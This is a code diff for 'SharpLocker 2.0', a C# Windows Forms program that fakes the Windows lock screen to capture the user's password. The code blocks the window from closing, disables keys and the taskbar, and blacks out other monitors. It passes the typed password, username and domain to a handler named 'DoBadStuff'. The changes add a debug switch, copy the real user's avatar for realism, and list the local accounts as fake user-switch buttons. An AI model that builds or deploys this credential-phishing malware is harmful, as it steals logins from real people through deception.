@@ -1,7 +1,12 @@
 ﻿using SharpLocker_2._0.Classes;
 using System;
+using System.Collections.Generic;
 using System.Data;
+using System.DirectoryServices;
+using System.DirectoryServices.AccountManagement;
 using System.Drawing;
+using System.Drawing.Drawing2D;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
 using System.Threading.Tasks;
@@ -11,10 +16,15 @@ namespace SharpLocker_2._0
 {
     public partial class WindowsLogin : Form
     {
+        #region "Variables and Stuff"
+
         private bool DenyClose { get; set; }
         private Interfaces.IDoBadStuff DoBadStuff;
 
         private const string PLACEHOLDER_TEXT = "Password";
+        private const bool DEBUG_MODE = false;
+
+        #endregion
 
         public WindowsLogin()
         {
@@ -26,7 +36,7 @@ namespace SharpLocker_2._0
 
         private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
         {
-            e.Cancel = DenyClose;
+            if (!DEBUG_MODE) e.Cancel = DenyClose;
         }
 
         protected override CreateParams CreateParams
@@ -40,7 +50,6 @@ namespace SharpLocker_2._0
             }
         }
 
-
         #endregion
 
         private void LoginButton_Click(object sender, EventArgs e)
@@ -49,7 +58,7 @@ namespace SharpLocker_2._0
             if (PasswordTextBox.Text == PLACEHOLDER_TEXT) return;
 
             DenyClose = false;
-            KeyPressHandler.Enable();
+            if (!DEBUG_MODE) KeyPressHandler.Enable();
 
             DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);
 
@@ -126,12 +135,14 @@ namespace SharpLocker_2._0
             InitializeBackground();
             InitializeBadStuff();
             InitializeOtherScreens();
+            InitializeOtherUsers();
         }
 
         private void InitializeMisc()
         {
             DenyClose = true;
             CapsLockLabel.Visible = false;
+            TopMost = !DEBUG_MODE;
         }
 
         private void InitializePasswordTextbox()
@@ -148,7 +159,7 @@ namespace SharpLocker_2._0
 
         private void InitializeTaskbar()
         {
-            KeyPressHandler.Disable();
+            if (!DEBUG_MODE) KeyPressHandler.Disable();
         }
 
         private void InitializeUserLabel()
@@ -176,31 +187,17 @@ namespace SharpLocker_2._0
 
         private void InitializeUserIcon()
         {
-            UserIconPictureBox.Image = GetUserIconFromPath("bmp");
-
-            if (UserIconPictureBox.Image is null)
-                UserIconPictureBox.Image = GetUserIconFromPath("png");
-
-            if (UserIconPictureBox.Image is null)
-                UserIconPictureBox.Image = GetUserIconFromPath("jpg");
-
-            if (UserIconPictureBox.Image is null)
-                UserIconPictureBox.Image = Properties.Resources.defaultAvatar;
-
-            System.Drawing.Drawing2D.GraphicsPath gp = new System.Drawing.Drawing2D.GraphicsPath();
-            gp.AddEllipse(0, 0, UserIconPictureBox.Width - 3, UserIconPictureBox.Height - 3);
-            Region rg = new Region(gp);
-            UserIconPictureBox.Region = rg;
+            SetUserIconByName(Environment.UserName, UserIconPictureBox);
         }
 
-        private Image GetUserIconFromPath(string fileEnding)
+        private Image GetUserIconFromPath(string fileEnding, string path)
         {
             try
             {
-                foreach (string f in Directory.GetFiles(Path.GetTempPath()))
+                foreach (string f in Directory.GetFiles(path))
                 {
                     if (!f.EndsWith($".{fileEnding}")) continue;
-                    if (!f.Contains(Environment.UserName)) continue;
+                    if (!Path.GetFileName(f).Contains(Environment.UserName)) continue;
                     return Image.FromFile(f);
                 }
 
@@ -212,11 +209,84 @@ namespace SharpLocker_2._0
             }
         }
 
+        private void SetUserIconByName(string username, PictureBox pb)
+        {
+            Image img = null;
+
+            string[] pathArr = Path.GetTempPath().Split('\\');
+            string[] userDomainFromPath = pathArr[2].Split('.');
+
+            try
+            {
+                switch (userDomainFromPath.Length)
+                {
+                    case 1:
+                        pathArr[2] = username;
+                        break;
+
+                    case 2:
+                        userDomainFromPath[0] = username;
+                        pathArr[2] = string.Join(".", userDomainFromPath);
+                        break;
+                }
+            }
+            catch { }
+
+            string path = string.Join("\\", pathArr);
+
+            if (string.IsNullOrEmpty(username))
+                img = Properties.Resources.defaultAvatar;
+
+            if (img is null)
+                img = GetUserIconFromPath("bmp", path);
+
+            if (img is null)
+                img = GetUserIconFromPath("png", path);
+
+            if (img is null)
+                img = GetUserIconFromPath("jpg", path);
+
+            if (img is null)
+                img = Properties.Resources.defaultAvatar;
+
+            pb.Image = ResizeImage(img, pb.Width, pb.Height);
+
+            GraphicsPath gp = new GraphicsPath();
+            gp.AddEllipse(0, 0, pb.Width - 1, pb.Height - 1);
+            Region rg = new Region(gp);
+            pb.Region = rg;
+        }
+
+        public Bitmap ResizeImage(Image image, int width, int height)
+        {
+            var destRect = new Rectangle(0, 0, width, height);
+            var destImage = new Bitmap(width, height);
+
+            destImage.SetResolution(image.HorizontalResolution, image.VerticalResolution);
+
+            using (var graphics = Graphics.FromImage(destImage))
+            {
+                graphics.CompositingMode = CompositingMode.SourceCopy;
+                graphics.CompositingQuality = CompositingQuality.HighQuality;
+                graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
+                graphics.SmoothingMode = SmoothingMode.HighQuality;
+                graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;
+
+                using (var wrapMode = new ImageAttributes())
+                {
+                    wrapMode.SetWrapMode(WrapMode.TileFlipXY);
+                    graphics.DrawImage(image, destRect, 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, wrapMode);
+                }
+            }
+
+            return destImage;
+        }
+
         private void InitializeOtherScreens()
         {
             foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
             {
-                new Task(() => BlackScreen(screen)).Start();
+                if (!DEBUG_MODE) new Task(() => BlackScreen(screen)).Start();
             }
         }
 
@@ -247,7 +317,94 @@ namespace SharpLocker_2._0
                 PasswordTextBox.Height + offset));
         }
 
-        #endregion
+        private void InitializeOtherUsers()
+        {
+            const int UF_ACCOUNTDISABLE = 0x0002;
+            int buttonCounter = 0;
+
+            AddChangeUserButton(null, buttonCounter);
+            buttonCounter++;
+
+            DirectoryEntry localMachine = new DirectoryEntry("WinNT://" + Environment.MachineName);
+            foreach (DirectoryEntry user in localMachine.Children)
+            {
+                if (user.SchemaClassName != "User") continue;
+                if (((int)user.Properties["UserFlags"].Value & UF_ACCOUNTDISABLE) == UF_ACCOUNTDISABLE) continue;
+                if (user.Name == "Admin") continue;
+
+                AddChangeUserButton(user, buttonCounter);
+                buttonCounter++;
+            }
+
+        }
+
+        private void AddChangeUserButton(DirectoryEntry user, int buttonCount)
+        {
+            int buttonX = 12;
+            int buttonY = 388;
+            int buttonWidth = 200;
+            int buttonHeight = 50;
+            int pictureBoxXOffset = 10;
+            int pictureBoxYOffset = 2;
+
+            Button b = new Button()
+            {
+                Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
+                Location = new Point(buttonX, buttonY + buttonHeight * buttonCount * -1),
+                Size = new Size(buttonWidth, buttonHeight),
+                FlatStyle = FlatStyle.Flat,
+                BackColor = Color.Transparent,
+                Font = new Font("Microsoft Sans Seri", 12),
+                ForeColor = Color.White,
+                BackgroundImageLayout = ImageLayout.Stretch
+            };
+
+            b.FlatAppearance.BorderSize = 0;
+            b.FlatAppearance.MouseOverBackColor = Color.LightGray;
+            b.Paint += (s, e) =>
+            {
+                e.Graphics.DrawString(FindDisplayName(user), b.Font, Brushes.White, buttonHeight + pictureBoxXOffset * 2, buttonHeight * 0.25f);
+            };
+
+            if (!(user is null) && user.Name == Environment.UserName) b.BackgroundImage = Properties.Resources.defaultButtonBackground;
+
+            PictureBox pb = new PictureBox()
+            {
+                BackColor = Color.Transparent,
+                Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
+                BackgroundImageLayout = ImageLayout.Stretch,
+                Location = new Point(buttonX + pictureBoxXOffset, (buttonY + pictureBoxYOffset / 2) + buttonHeight * buttonCount * -1),
+                Size = new Size(buttonHeight - pictureBoxYOffset, buttonHeight - pictureBoxYOffset)
+            };
+
+            SetUserIconByName(user is null ? "" : user.Name, pb);
+
+            Controls.Add(pb);
+            Controls.Add(b);
+        }
+
+        private string FindDisplayName(DirectoryEntry user)
+        {
+            string displayName = "";
+
+            if (user is null)
+                return "Other User";
+
+            try
+            {
+                if (string.IsNullOrEmpty(displayName))
+                    displayName = UserPrincipal.FindByIdentity(UserPrincipal.Current.Context, user.Name).DisplayName;
+            }
+            catch { }
+
+            if (string.IsNullOrEmpty(displayName))
+                return user.Name;
+
+            return displayName;
+        }
 
     }
+
+    #endregion
+
 }
